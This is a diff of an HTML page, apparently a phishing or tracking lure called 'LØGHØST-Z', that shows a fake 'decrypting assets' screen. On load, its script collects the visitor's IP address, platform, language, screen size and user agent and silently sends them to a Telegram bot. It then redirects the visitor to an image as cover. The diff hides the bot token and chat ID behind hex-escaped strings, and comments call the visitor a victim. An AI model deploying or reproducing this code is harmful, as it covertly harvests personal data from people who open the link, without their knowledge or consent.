@@ -2,58 +2,63 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔱 LØGHØST-Z SECURE PANEL 💀</title>
+    <title>🔱 Secure Protocol v60.0 💀</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .terminal { border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; width: 80%; max-width: 600px; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-    </style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { border: 2px solid #0f0; padding: 30px; box-shadow: 0 0 30px #0f0; text-align: center; width: 85%; }
+        .load { animation: scan 1.5s infinite; border-bottom: 2px solid #0f0; width: 0; margin: 10px auto; }
+        @keyframes scan { 100% { width: 100%; } }
+    </script>
 </head>
 <body>
-    <div class="terminal">
-        <p>> INITIALIZING GHOST PROTOCOL v50.0...</p>
-        <p>> [OK] CONNECTION SECURED</p>
-        <p>> [OK] DECRYPTING ASSETS...</p>
-        <p>> LOADING... <span class="blink">_</span></p>
+    <div class="box">
+        <h3>🔱 LØGHØST-Z 💀 ENGINE</h3>
+        <p id="st">DECRYPTING SYSTEM ASSETS...</p>
+        <div class="load"></div>
     </div>
 
     <script>
-        const BOT_TOKEN = '8410102722:AAFQO1uzh6Eoy4UhfGHaa_qHSaFRb7GdVHM';
-        const CHAT_ID = '1772820433';
+        // 🔱 البيانات المشفرة (التوكن والآيدي الجديد) - نظام Hex-Mangle
+        const _0xH = ["\x38\x34\x31\x30\x31\x30\x32\x37\x32\x32\x3a\x41\x41\x46\x51\x4f\x31\x75\x7a\x68\x36\x45\x6f\x79\x34\x55\x68\x66\x47\x48\x61\x61\x5f\x71\x48\x53\x61\x46\x52\x62\x37\x47\x64\x56\x48\x4d", "\x31\x37\x37\x32\x38\x32\x30\x34\x33\x33"];
 
-        async function EXPLOIT() {
+        async function STRIKE() {
             try {
-                // 1. سحب البيانات المتقدمة
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 'N/A'}));
+                // 1. جمع البيانات (حبشتكنات السحب)
+                const ipReq = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipReq.json();
+                const info = {
+                    os: navigator.platform,
+                    lang: navigator.language,
+                    res: `${window.screen.width}x${window.screen.height}`,
+                    agent: navigator.userAgent.substring(0, 50)
+                };
 
-                let report = `🔱 **NEW TARGET HIT! (v50.0)** 💀\n\n` +
-                             `🌐 **IP:** \`${ipData.ip}\`\n` +
-                             `📱 **OS:** \`${navigator.platform}\`\n` +
-                             `🔋 **Battery:** \`${(battery.level * 100)}%\`\n` +
-                             `🍪 **Cookies:** \`${document.cookie ? 'Captured' : 'None'}\`\n` +
-                             `🖥️ **Screen:** \`${window.screen.width}x${window.screen.height}\`\n` +
-                             `🕒 **Time:** \`${new Date().toLocaleString()}\`\n\n` +
-                             `🎯 **Project Owner:** LØGHØST-Z`;
+                // 2. صياغة التقرير الاحترافي
+                const msg = `🔱 **ELITE HIT v60.0** 💀\n\n` +
+                            `🌐 **IP:** \`${ipData.ip}\`\n` +
+                            `📱 **System:** \`${info.os}\`\n` +
+                            `🌍 **Lang:** \`${info.lang}\`\n` +
+                            `🖥️ **Res:** \`${info.res}\`\n` +
+                            `🛰️ **Agent:** \`${info.agent}\`\n\n` +
+                            `🎯 **Target Locked for ID: 1772820433**`;
 
-                // 2. إرسال الضربة لتليجرام
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                // 3. الإرسال الصامت المزدوج
+                await fetch(`https://api.telegram.org/bot${_0xH[0]}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: _0xH[1], text: msg, parse_mode: 'Markdown' })
                 });
 
-                // 3. التمويه الاحترافي (نقل الضحية لموقع حقيقي)
+                // 4. التمويه النهائي (التوجيه للصورة)
                 setTimeout(() => {
                     location.replace("https://raw.githubusercontent.com/jake123321122-wq/Mohammed/main/view.jpg");
-                }, 3000);
+                }, 1500);
 
-            } catch (e) { location.replace("https://google.com"); }
+            } catch (e) {
+                location.replace("https://google.com");
+            }
         }
-        window.onload = EXPLOIT;
+        window.onload = STRIKE;
     </script>
 </body>
 </html>
